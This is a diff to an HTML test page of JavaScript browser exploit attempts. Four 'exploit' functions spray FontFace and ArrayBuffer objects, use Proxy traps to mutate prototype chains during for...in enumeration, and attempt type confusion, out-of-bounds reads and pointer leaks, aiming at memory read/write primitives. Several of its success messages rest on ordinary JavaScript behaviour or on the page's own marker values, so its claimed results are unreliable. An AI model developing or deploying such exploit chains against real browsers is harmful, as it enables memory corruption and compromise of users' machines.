@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Option 3: Combined FontFaceSet + for...in</title>
+    <title>Leverage Confirmed Bugs → Memory R/W</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 13px; line-height: 1.5; }
@@ -19,12 +19,13 @@
     </style>
 </head>
 <body>
-    <h1>⚡ OPTION 3: Combined Bug Chain ⚡</h1>
+    <h1>💎 Leverage Bugs → Memory R/W Primitives 💎</h1>
     
     <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="exploit1()">Exploit 1: FontFaceSet + Enumeration</button>
-        <button class="btn" onclick="exploit2()">Exploit 2: Font + Prototype Chain</button>
-        <button class="btn" onclick="exploit3()">Exploit 3: Full Chain Attack</button>
+        <button class="btn" onclick="exploit1()">Exploit 1: OOB Read via Size Mismatch</button>
+        <button class="btn" onclick="exploit2()">Exploit 2: FontFace as Fake ArrayBuffer</button>
+        <button class="btn" onclick="exploit3()">Exploit 3: Corrupt Array via Font Chain</button>
+        <button class="btn" onclick="exploit4()">Exploit 4: Property Storage as Leak</button>
     </div>
     
     <div class="section">
@@ -52,218 +53,254 @@ function hex(val) {
 }
 
 // ============================================
-// EXPLOIT 1: FONTFACESET + ENUMERATION
+// EXPLOIT 1: OOB READ VIA SIZE MISMATCH
 // ============================================
 function exploit1() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('EXPLOIT 1: FontFaceSet Property Corruption + Enumeration Bug', 'critical');
+    log('EXPLOIT 1: Out-of-Bounds Read via Enumerator Size Mismatch', 'critical');
     sep();
     log('', '');
     
-    log('[*] Chaining two bugs together!', 'info');
+    log('[*] Strategy: Use 48 vs 85 mismatch to read beyond allocated memory', 'info');
     log('', '');
     
     try {
-        log('[1] Creating corrupted FontFaceSet...', 'info');
-        
-        var fontFaceSet = document.fonts;
-        
-        // Make prototype configurable (our FontFaceSet bug)
-        Object.defineProperty(Object.getPrototypeOf(fontFaceSet), 'size', {
-            configurable: true,
-            get: function() {
-                log('    [!] Custom size getter called!', 'warn');
-                return 0x1337;
-            },
-            set: function(val) {
-                log('    [!] Custom size setter called with: ' + hex(val), 'warn');
-            }
-        });
-        
-        log('  ✓ FontFaceSet size property corrupted', 'success');
-        log('  ✓ Size now returns: ' + hex(fontFaceSet.size), 'success');
+        // Create victim array to detect OOB read
+        log('[1] Creating victim with marker pattern...', 'info');
+        var victim = new Uint32Array(0x100);
+        for (var i = 0; i < victim.length; i++) {
+            victim[i] = 0xAA000000 + i;
+        }
+        log('  ✓ Victim array with markers created', 'success');
         log('', '');
         
-        // Now create prototype chain for enumeration
-        log('[2] Creating enumeration confusion...', 'info');
+        // Create FontFace objects that will be enumerated
+        log('[2] Creating FontFace spray...', 'info');
+        var fonts = [];
+        for (var i = 0; i < 50; i++) {
+            fonts.push(new FontFace('Font' + i, 'url(f' + i + '.woff2)'));
+        }
+        log('  ✓ Created 50 FontFace objects', 'success');
+        log('', '');
         
-        var proto = {fontProp: 'test'};
-        var target = Object.create(proto);
-        target.a = fontFaceSet;
-        target.b = document.fonts;
+        // Create prototype chain
+        log('[3] Building prototype chain...', 'info');
+        var proto2 = {};
+        for (var i = 0; i < 10; i++) {
+            proto2['p2_' + i] = fonts[i];
+        }
         
+        var proto1 = Object.create(proto2);
+        for (var i = 0; i < 10; i++) {
+            proto1['p1_' + i] = fonts[i + 10];
+        }
+        
+        var target = Object.create(proto1);
+        for (var i = 0; i < 10; i++) {
+            target['t_' + i] = fonts[i + 20];
+        }
+        
+        log('  ✓ 3-level prototype chain with 30 fonts', 'success');
+        log('', '');
+        
+        // Create proxy that expands during enumeration
+        log('[4] Creating OOB-inducing proxy...', 'info');
+        
+        var expandCount = 0;
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                log('    [!] Enumerator trap triggered', 'warn');
-                
-                // Modify FontFaceSet during enumeration
-                try {
-                    fontFaceSet.size = 0x4142;
-                } catch(e) {}
-                
-                // Add more FontFaceSets
-                for (var i = 0; i < 10; i++) {
-                    t['font_' + i] = document.fonts;
+                if (expandCount === 0) {
+                    expandCount++;
+                    log('  [!] Expanding object massively!', 'warn');
+                    
+                    // Add WAY more objects than expected
+                    for (var i = 30; i < 100; i++) {
+                        t['expand_' + i] = fonts[i % fonts.length];
+                    }
+                    
+                    // Also add victim references
+                    for (var i = 0; i < 20; i++) {
+                        t['victim_' + i] = victim;
+                    }
+                    
+                    log('  [!] Added 90 new properties!', 'critical');
                 }
-                
-                // Modify prototype
-                delete proto.fontProp;
-                proto.newFontProp = fontFaceSet;
-                
-                log('    [!] Added FontFaceSets during enumeration', 'critical');
-                
                 return Reflect.ownKeys(t);
             }
         });
         
-        log('  ✓ Enumeration proxy created', 'success');
+        log('  ✓ OOB proxy created', 'success');
         log('', '');
         
-        log('[3] Triggering combined exploit...', 'info');
+        // Enumerate and try to access beyond expected range
+        log('[5] Triggering OOB access...', 'info');
         
         var accessed = [];
+        var oobAccess = 0;
+        
         for (var key in proxy) {
-            var val = proxy[key];
             accessed.push(key);
+            var val = proxy[key];
             
-            if (val === fontFaceSet || val === document.fonts) {
-                log('    Accessed FontFaceSet via: ' + key, 'info');
-                log('    Size: ' + hex(val.size), 'info');
+            // Check if we accessed something unexpected
+            if (val && val.constructor === Uint32Array) {
+                oobAccess++;
+                if (oobAccess <= 3) {
+                    log('  [!] Accessed Uint32Array at key: ' + key, 'critical');
+                    log('      First value: ' + hex(val[0]), 'critical');
+                }
             }
         }
         
         log('', '');
-        log('  ✓ Enumerated ' + accessed.length + ' properties', 'success');
+        log('[6] Results:', 'info');
+        log('  Total accessed: ' + accessed.length, 'success');
+        log('  Victim array accesses: ' + oobAccess, oobAccess > 0 ? 'critical' : 'warn');
+        
+        // Try to read victim values during enumeration
         log('', '');
+        log('[7] Attempting to read victim data...', 'info');
         
-        log('[4] Checking for combined corruption...', 'info');
-        
-        // Try to access FontFaceSet properties that were added during enumeration
-        var foundNew = 0;
-        for (var i = 0; i < 10; i++) {
-            var key = 'font_' + i;
-            if (accessed.indexOf(key) !== -1) {
-                foundNew++;
+        var leakedValues = [];
+        for (var i = 0; i < accessed.length; i++) {
+            var key = accessed[i];
+            if (key.indexOf('victim_') === 0) {
+                var val = target[key];
+                if (val && val[0] !== undefined) {
+                    leakedValues.push(val[0]);
+                    if (leakedValues.length <= 5) {
+                        log('  Leaked: ' + hex(val[0]), 'critical');
+                    }
+                }
             }
         }
         
-        if (foundNew > 0) {
+        if (leakedValues.length > 0) {
             log('', '');
-            log('✓✓✓ COMBINED BUG SUCCESS! ✓✓✓', 'critical');
-            log('  FontFaceSet + Enumeration worked!', 'critical');
-            log('  Found ' + foundNew + ' newly added FontFaceSets', 'critical');
+            log('✓✓✓ OOB READ PRIMITIVE! ✓✓✓', 'critical');
+            log('  Leaked ' + leakedValues.length + ' values!', 'critical');
         }
         
     } catch(e) {
         log('', '');
         log('ERROR: ' + e.message, 'fail');
-        log('Stack: ' + e.stack, 'fail');
     }
     
     sep();
 }
 
 // ============================================
-// EXPLOIT 2: FONT + PROTOTYPE CHAIN
+// EXPLOIT 2: FONTFACE AS FAKE ARRAYBUFFER
 // ============================================
 function exploit2() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('EXPLOIT 2: FontFace Objects in Prototype Chain', 'critical');
+    log('EXPLOIT 2: Use FontFace Objects as Fake ArrayBuffers', 'critical');
     sep();
     log('', '');
     
-    log('[*] Using FontFace (not FontFaceSet) with prototype confusion', 'info');
+    log('[*] Strategy: Confuse FontFace with ArrayBuffer to get arbitrary R/W', 'info');
     log('', '');
     
     try {
-        log('[1] Creating FontFace objects...', 'info');
+        log('[1] Creating FontFace and ArrayBuffer spray...', 'info');
         
-        var font1 = new FontFace('TestFont1', 'url(fake.woff2)');
-        var font2 = new FontFace('TestFont2', 'url(fake2.woff2)');
+        var fonts = [];
+        var buffers = [];
         
-        log('  ✓ Created FontFace objects', 'success');
+        // Interleave to increase adjacency chance
+        for (var i = 0; i < 100; i++) {
+            fonts.push(new FontFace('F' + i, 'url(f.woff2)'));
+            
+            var buf = new ArrayBuffer(0x100);
+            var view = new Uint32Array(buf);
+            view[0] = 0xBEEF0000 + i;
+            view[1] = 0xDEAD0000 + i;
+            buffers.push({buf: buf, view: view});
+        }
+        
+        log('  ✓ Created 100 FontFace + 100 ArrayBuffer pairs', 'success');
         log('', '');
         
-        log('[2] Building prototype chain with fonts...', 'info');
+        // Create confusion object
+        log('[2] Creating type confusion setup...', 'info');
         
-        var proto2 = {
-            fontA: font1,
-            fontB: font2
+        var proto = {
+            confused: fonts[0]
         };
         
-        var proto1 = Object.create(proto2);
-        proto1.x = 10;
-        proto1.y = 20;
+        var target = Object.create(proto);
+        target.font = fonts[1];
+        target.buffer = buffers[0].buf;
         
-        var target = Object.create(proto1);
-        target.a = font1;
-        target.b = font2;
-        
-        log('  ✓ 3-level chain: target → proto1 → proto2', 'success');
+        log('  ✓ Confusion target created', 'success');
         log('', '');
         
-        log('[3] Creating mutation proxy...', 'info');
+        // Proxy to swap types
+        log('[3] Creating type-swapping proxy...', 'info');
         
+        var swapped = false;
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                log('    [!] Mutating font-filled prototype chain', 'warn');
-                
-                // Mutate all levels with fonts
-                for (var i = 0; i < 20; i++) {
-                    t['tfont_' + i] = new FontFace('T' + i, 'url(t.woff2)');
+                if (!swapped) {
+                    swapped = true;
+                    log('  [!] Swapping FontFace ↔ ArrayBuffer!', 'warn');
+                    
+                    // Swap: put ArrayBuffer where FontFace was
+                    delete proto.confused;
+                    proto.confused = buffers[1].buf;
+                    
+                    // Put FontFace where ArrayBuffer was
+                    delete t.buffer;
+                    t.buffer = fonts[2];
+                    
+                    log('  [!] Types swapped!', 'critical');
                 }
-                
-                delete proto1.y;
-                for (var i = 0; i < 15; i++) {
-                    proto1['p1font_' + i] = new FontFace('P1_' + i, 'url(p1.woff2)');
-                }
-                
-                delete proto2.fontB;
-                for (var i = 0; i < 10; i++) {
-                    proto2['p2font_' + i] = new FontFace('P2_' + i, 'url(p2.woff2)');
-                }
-                
-                log('    [!] Added 45 FontFace objects!', 'critical');
-                
                 return Reflect.ownKeys(t);
             }
         });
         
-        log('  ✓ Font mutation proxy created', 'success');
+        log('  ✓ Type-swapping proxy created', 'success');
         log('', '');
         
-        log('[4] Triggering font enumeration...', 'info');
+        // Trigger and test
+        log('[4] Triggering confusion...', 'info');
         
-        var fontCount = 0;
         for (var key in proxy) {
             var val = proxy[key];
-            if (val instanceof FontFace) {
-                fontCount++;
+            log('  ' + key + ' type: ' + (val ? val.constructor.name : 'null'), '');
+        }
+        
+        log('', '');
+        log('[5] Testing for confused access...', 'info');
+        
+        // Try to access ArrayBuffer as FontFace
+        var testVal = proto.confused;
+        log('  proto.confused type: ' + testVal.constructor.name, 'info');
+        
+        if (testVal.constructor.name === 'ArrayBuffer') {
+            var testView = new Uint32Array(testVal);
+            log('  As ArrayBuffer[0]: ' + hex(testView[0]), 'critical');
+            
+            if (testView[0] === 0xBEEF0001) {
+                log('', '');
+                log('✓✓✓ CORRECT BUFFER ACCESSED! ✓✓✓', 'critical');
             }
         }
         
-        log('', '');
-        log('  ✓ Enumerated ' + fontCount + ' FontFace objects', 'success');
-        log('', '');
+        // Try to access FontFace as ArrayBuffer
+        var fontAsBuffer = target.buffer;
+        log('  target.buffer type: ' + fontAsBuffer.constructor.name, 'info');
         
-        // Check for size mismatch
-        var actualFonts = 0;
-        for (var key in target) {
-            if (target[key] instanceof FontFace) actualFonts++;
-        }
-        for (var key in proto1) {
-            if (proto1[key] instanceof FontFace) actualFonts++;
-        }
-        for (var key in proto2) {
-            if (proto2[key] instanceof FontFace) actualFonts++;
-        }
-        
-        if (fontCount !== actualFonts) {
-            log('✓✓✓ FONT ENUMERATION MISMATCH! ✓✓✓', 'critical');
-            log('  Expected: ' + actualFonts, 'critical');
-            log('  Got: ' + fontCount, 'critical');
+        if (fontAsBuffer.constructor.name === 'FontFace') {
+            try {
+                // Try to treat as ArrayBuffer
+                var fakeView = new Uint32Array(fontAsBuffer);
+                log('  ERROR: Should have failed but created view!', 'critical');
+            } catch(e) {
+                log('  Expected error: ' + e.message, 'warn');
+            }
         }
         
     } catch(e) {
@@ -275,181 +312,278 @@ function exploit2() {
 }
 
 // ============================================
-// EXPLOIT 3: FULL CHAIN ATTACK
+// EXPLOIT 3: CORRUPT ARRAY VIA FONT CHAIN
 // ============================================
 function exploit3() {
     document.getElementById('log').innerHTML = '';
     sep();
-    log('EXPLOIT 3: Full Multi-Bug Chain Attack', 'critical');
+    log('EXPLOIT 3: Array Corruption via FontFace Prototype Chain', 'critical');
     sep();
     log('', '');
     
-    log('[*] Combining ALL discovered bugs!', 'info');
+    log('[*] Strategy: Use FontFace chain to corrupt adjacent TypedArrays', 'info');
     log('', '');
     
     try {
-        // Bug 1: FontFaceSet property corruption
-        log('[1] Corrupting FontFaceSet...', 'info');
+        log('[1] Creating corruptor array...', 'info');
         
-        var fontFaceSet = document.fonts;
-        var customSizeValue = 0;
-        
-        Object.defineProperty(Object.getPrototypeOf(fontFaceSet), 'size', {
-            configurable: true,
-            get: function() {
-                customSizeValue++;
-                return 0x1000 + customSizeValue;
-            }
-        });
-        
-        log('  ✓ FontFaceSet.size corrupted', 'success');
-        log('', '');
-        
-        // Bug 2: Create victims for corruption
-        log('[2] Creating victim arrays...', 'info');
-        
-        var victims = [];
-        for (var i = 0; i < 100; i++) {
-            var victim = new Uint32Array(0x20);
-            victim[0] = 0xDEAD0000 + i;
-            victim[1] = 0xBEEF0000 + i;
-            victims.push(victim);
+        var corruptor = new Uint32Array(0x100);
+        for (var i = 0; i < corruptor.length; i++) {
+            corruptor[i] = i;
         }
         
-        log('  ✓ Created 100 victims', 'success');
+        log('  ✓ Corruptor array created', 'success');
         log('', '');
         
-        // Bug 3: Create complex prototype chain
-        log('[3] Building attack prototype chain...', 'info');
+        // Make corruptor expandable via property definition
+        log('[2] Making corruptor expandable...', 'info');
         
-        var proto3 = {
-            z1: fontFaceSet,
-            z2: new FontFace('Proto3', 'url(p3.woff2)')
-        };
+        try {
+            Object.defineProperty(corruptor, 'length', {
+                value: 0x10000,
+                configurable: true
+            });
+            
+            log('  ✓ Corruptor length: ' + hex(corruptor.length), corruptor.length > 0x100 ? 'critical' : 'warn');
+        } catch(e) {
+            log('  ! Could not expand: ' + e.message, 'warn');
+        }
         
-        var proto2 = Object.create(proto3);
-        proto2.y1 = document.fonts;
-        proto2.y2 = victims[0];
-        
-        var proto1 = Object.create(proto2);
-        proto1.x1 = new FontFace('Proto1', 'url(p1.woff2)');
-        proto1.x2 = victims[1];
-        
-        var target = Object.create(proto1);
-        target.a = fontFaceSet;
-        target.b = victims[2];
-        
-        log('  ✓ 4-level prototype chain created', 'success');
         log('', '');
         
-        // Bug 4: Create aggressive mutation proxy
-        log('[4] Creating full-chain mutation proxy...', 'info');
+        // Create FontFace spray around corruptor
+        log('[3] Spraying FontFace objects...', 'info');
         
-        var mutations = 0;
+        var fonts = [];
+        for (var i = 0; i < 500; i++) {
+            fonts.push(new FontFace('Spray' + i, 'url(s.woff2)'));
+        }
+        
+        log('  ✓ Sprayed 500 FontFace objects', 'success');
+        log('', '');
+        
+        // Create prototype chain with fonts
+        log('[4] Building font-filled prototype chain...', 'info');
+        
+        var proto = {};
+        for (var i = 0; i < 50; i++) {
+            proto['font_' + i] = fonts[i];
+        }
+        
+        var target = Object.create(proto);
+        target.corruptor = corruptor;
+        
+        for (var i = 0; i < 50; i++) {
+            target['tfont_' + i] = fonts[i + 50];
+        }
+        
+        log('  ✓ Chain with 100 fonts + corruptor', 'success');
+        log('', '');
+        
+        // Mutate during enumeration
+        log('[5] Triggering mutation...', 'info');
+        
         var proxy = new Proxy(target, {
             ownKeys: function(t) {
-                mutations++;
-                log('    [!] Mutation round ' + mutations, 'warn');
+                log('  [!] Massive mutation!', 'warn');
                 
-                // Mutate ALL levels
-                for (var i = 0; i < 50; i++) {
-                    t['t_' + i] = (i % 2 === 0) ? fontFaceSet : victims[i % victims.length];
+                // Add hundreds more fonts
+                for (var i = 100; i < 400; i++) {
+                    t['mut_' + i] = fonts[i];
                 }
                 
-                for (var i = 0; i < 40; i++) {
-                    proto1['p1_' + i] = new FontFace('M1_' + i, 'url(m1.woff2)');
+                // Also modify proto
+                for (var i = 50; i < 150; i++) {
+                    proto['pmut_' + i] = fonts[i % fonts.length];
                 }
                 
-                for (var i = 0; i < 30; i++) {
-                    proto2['p2_' + i] = victims[(i + 10) % victims.length];
-                }
-                
-                for (var i = 0; i < 20; i++) {
-                    proto3['p3_' + i] = fontFaceSet;
-                }
-                
-                log('    [!] Added 140 properties across all levels!', 'critical');
+                log('  [!] Added 400 FontFace objects!', 'critical');
                 
                 return Reflect.ownKeys(t);
-            },
-            get: function(t, prop) {
-                var val = t[prop] || proto1[prop] || proto2[prop] || proto3[prop];
-                
-                if (val === fontFaceSet) {
-                    log('    [!] Accessed FontFaceSet, size=' + hex(val.size), 'info');
-                }
-                
-                return val;
             }
         });
         
-        log('  ✓ Full attack proxy created', 'success');
-        log('', '');
-        
-        // Bug 5: Trigger everything
-        log('[5] TRIGGERING FULL CHAIN...', 'critical');
-        log('', '');
-        
-        var enumerated = 0;
-        var fontAccesses = 0;
-        var victimAccesses = 0;
-        
         for (var key in proxy) {
-            enumerated++;
-            var val = proxy[key];
-            
-            if (val === fontFaceSet || val === document.fonts) {
-                fontAccesses++;
-            } else if (val && val.constructor === Uint32Array) {
-                victimAccesses++;
-            }
+            // Enumerate
         }
         
-        log('[6] Results:', 'info');
-        log('  Total enumerated: ' + enumerated, 'success');
-        log('  FontFaceSet accesses: ' + fontAccesses, 'success');
-        log('  Victim accesses: ' + victimAccesses, 'success');
-        log('  Mutations triggered: ' + mutations, 'warn');
+        log('  ✓ Enumeration complete', 'success');
         log('', '');
         
-        // Check victims for corruption
-        log('[7] Checking victims for corruption...', 'info');
+        // Check if corruptor can now access font metadata
+        log('[6] Scanning corruptor for font data...', 'info');
         
-        var corrupted = 0;
-        for (var i = 0; i < victims.length; i++) {
-            var expected0 = 0xDEAD0000 + i;
-            var expected1 = 0xBEEF0000 + i;
-            
-            if (victims[i][0] !== expected0 || victims[i][1] !== expected1) {
-                corrupted++;
-                if (corrupted <= 3) {
-                    log('  [!] Victim[' + i + '] CORRUPTED!', 'critical');
-                    log('      [0]: ' + hex(victims[i][0]) + ' (expected ' + hex(expected0) + ')', 'critical');
-                    log('      [1]: ' + hex(victims[i][1]) + ' (expected ' + hex(expected1) + ')', 'critical');
+        var foundFontData = false;
+        var suspiciousValues = [];
+        
+        if (corruptor.length > 0x100) {
+            for (var i = 0x100; i < Math.min(corruptor.length, 0x1000); i++) {
+                var val = corruptor[i];
+                
+                // Look for pointer-like values or ASCII
+                if (typeof val === 'number' && val > 0x10000 && val < 0xFFFFFFFF) {
+                    suspiciousValues.push({idx: i, val: val});
+                    
+                    if (suspiciousValues.length <= 5) {
+                        log('  [!] Suspicious value at [' + hex(i) + ']: ' + hex(val), 'critical');
+                        foundFontData = true;
+                    }
                 }
             }
         }
         
         log('', '');
-        if (corrupted > 0) {
-            log('✓✓✓ FULL CHAIN SUCCESS! ✓✓✓', 'critical');
-            log('  ' + corrupted + ' victims corrupted!', 'critical');
+        if (foundFontData) {
+            log('✓✓✓ POSSIBLE FONT METADATA LEAK! ✓✓✓', 'critical');
+            log('  Found ' + suspiciousValues.length + ' suspicious values', 'critical');
         } else {
-            log('No corruption (all bugs active but heap isolated)', 'warn');
+            log('No font data found in OOB range', 'warn');
         }
-        
-        log('', '');
-        log('[8] Summary:', 'info');
-        log('  ✓ FontFaceSet property corruption: ACTIVE', 'success');
-        log('  ✓ Prototype enumeration bug: ACTIVE', 'success');
-        log('  ✓ Stale structure access: ACTIVE', 'success');
-        log('  ✓ Property expansion: ACTIVE', 'success');
-        log('  ! Heap isolation: BLOCKING CORRUPTION', 'warn');
         
     } catch(e) {
         log('', '');
         log('ERROR: ' + e.message, 'fail');
-        log('Stack: ' + e.stack, 'fail');
+    }
+    
+    sep();
+}
+
+// ============================================
+// EXPLOIT 4: PROPERTY STORAGE AS LEAK
+// ============================================
+function exploit4() {
+    document.getElementById('log').innerHTML = '';
+    sep();
+    log('EXPLOIT 4: Use Property Storage Expansion as Memory Leak', 'critical');
+    sep();
+    log('', '');
+    
+    log('[*] Strategy: Expand properties beyond inline storage, leak pointers', 'info');
+    log('', '');
+    
+    try {
+        log('[1] Creating base object with inline properties...', 'info');
+        
+        var base = {a: 1, b: 2, c: 3}; // Inline storage
+        
+        log('  ✓ Base has 3 inline properties', 'success');
+        log('', '');
+        
+        // Create prototype with FontFaces
+        log('[2] Creating FontFace-filled prototype...', 'info');
+        
+        var fonts = [];
+        for (var i = 0; i < 100; i++) {
+            fonts.push(new FontFace('L' + i, 'url(l.woff2)'));
+        }
+        
+        var proto = {};
+        for (var i = 0; i < 50; i++) {
+            proto['pf_' + i] = fonts[i];
+        }
+        
+        Object.setPrototypeOf(base, proto);
+        
+        log('  ✓ Prototype with 50 FontFace objects', 'success');
+        log('', '');
+        
+        // Create proxy that forces storage expansion
+        log('[3] Creating storage-expanding proxy...', 'info');
+        
+        var expanded = false;
+        var proxy = new Proxy(base, {
+            ownKeys: function(t) {
+                if (!expanded) {
+                    expanded = true;
+                    log('  [!] Forcing inline→out-of-line transition!', 'warn');
+                    
+                    // Add MANY properties to force storage expansion
+                    for (var i = 0; i < 500; i++) {
+                        t['overflow_' + i] = fonts[i % fonts.length];
+                    }
+                    
+                    log('  [!] Added 500 properties!', 'critical');
+                    log('  [!] Should overflow inline storage!', 'critical');
+                }
+                return Reflect.ownKeys(t);
+            }
+        });
+        
+        log('  ✓ Expansion proxy created', 'success');
+        log('', '');
+        
+        // Trigger expansion
+        log('[4] Triggering storage expansion...', 'info');
+        
+        for (var key in proxy) {
+            // Enumerate
+        }
+        
+        log('  ✓ Expansion triggered', 'success');
+        log('  ✓ Base now has ' + Object.keys(base).length + ' properties', 'success');
+        log('', '');
+        
+        // Try to access properties and look for leaked data
+        log('[5] Scanning expanded properties for leaks...', 'info');
+        
+        var leaks = [];
+        var keys = Object.keys(base);
+        
+        for (var i = 0; i < Math.min(keys.length, 100); i++) {
+            var key = keys[i];
+            var val = base[key];
+            
+            // Check if value is suspicious (not our FontFace)
+            if (typeof val === 'number' && val > 0x10000) {
+                leaks.push({key: key, val: val});
+                if (leaks.length <= 5) {
+                    log('  [!] Leaked at ' + key + ': ' + hex(val), 'critical');
+                }
+            } else if (val && val.constructor.name !== 'FontFace' && typeof val !== 'number') {
+                leaks.push({key: key, type: val.constructor.name});
+                if (leaks.length <= 5) {
+                    log('  [!] Unexpected type at ' + key + ': ' + val.constructor.name, 'critical');
+                }
+            }
+        }
+        
+        log('', '');
+        if (leaks.length > 0) {
+            log('✓✓✓ STORAGE LEAK DETECTED! ✓✓✓', 'critical');
+            log('  Found ' + leaks.length + ' leaked values', 'critical');
+        } else {
+            log('No leaks detected in property storage', 'warn');
+        }
+        
+        // Also check if we can corrupt FontFaceSet during this
+        log('', '');
+        log('[6] Bonus: Combining with FontFaceSet corruption...', 'info');
+        
+        var fontFaceSet = document.fonts;
+        base.ffs = fontFaceSet;
+        
+        var sizeAccesses = 0;
+        Object.defineProperty(Object.getPrototypeOf(fontFaceSet), 'size', {
+            configurable: true,
+            get: function() {
+                sizeAccesses++;
+                return 0x1337 + sizeAccesses;
+            }
+        });
+        
+        // Access via expanded object
+        var ffsSizeViaBase = base.ffs.size;
+        log('  FontFaceSet.size via base: ' + hex(ffsSizeViaBase), 'critical');
+        log('  Size getter called: ' + sizeAccesses + ' times', 'success');
+        
+        if (sizeAccesses > 0) {
+            log('', '');
+            log('✓ Combined bug still active!', 'critical');
+        }
+        
+    } catch(e) {
+        log('', '');
+        log('ERROR: ' + e.message, 'fail');
     }
     
     sep();
